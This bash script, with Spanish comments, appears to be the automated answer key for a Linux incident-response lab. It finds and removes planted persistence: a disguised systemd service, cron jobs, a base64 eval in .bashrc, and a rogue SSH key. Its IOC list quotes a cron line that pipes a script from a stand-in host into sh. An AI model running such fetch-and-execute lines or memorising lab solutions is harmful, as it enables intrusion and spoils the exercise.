#!/usr/bin/env bash
# Solución automática (sirve para probar el lab). Corre como root dentro del lab.
set -e
systemctl list-unit-files --state=enabled --type=service
ls -la /etc/systemd/system/
for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null | sed "s/^/$u: /"; done
ls -la /etc/cron.d/
grep -n 'base64' /home/*/.bashrc /root/.bashrc || true
B64=$(grep -o 'echo [A-Za-z0-9+/=]* | base64 -d' /home/deploy/.bashrc | awk '{print $2}')
DEC=$(echo "$B64" | base64 -d)
cat > /home/analista/iocs.txt <<TXT
1 /etc/systemd/system/systemd-netlinkd.service -> /usr/lib/systemd/systemd-netlinkd (beacon a cdn-update.example.net)
2 crontab de www-data: */10 curl http://cdn-update.example.net/u.sh | sh
3 /etc/cron.d/apt-compat-check -> /var/lib/apt/.cache/update (cdn-update.example.net)
4 /home/deploy/.bashrc: eval base64 -> $DEC  (ssh-keys.example.net)
5 /root/.ssh/authorized_keys: llave backup@infra
TXT
chown analista:analista /home/analista/iocs.txt
mkdir -p /root/evidencia
cp -a /etc/systemd/system/systemd-netlinkd.service /usr/lib/systemd/systemd-netlinkd /etc/cron.d/apt-compat-check /var/lib/apt/.cache/update /root/evidencia/
systemctl disable --now systemd-netlinkd.service
rm -f /etc/systemd/system/systemd-netlinkd.service /usr/lib/systemd/systemd-netlinkd
systemctl daemon-reload
crontab -r -u www-data
rm -f /etc/cron.d/apt-compat-check; rm -rf /var/lib/apt/.cache
sed -i '/# locale fix/d; /base64 -d/d' /home/deploy/.bashrc
sed -i '/backup@infra/d' /root/.ssh/authorized_keys
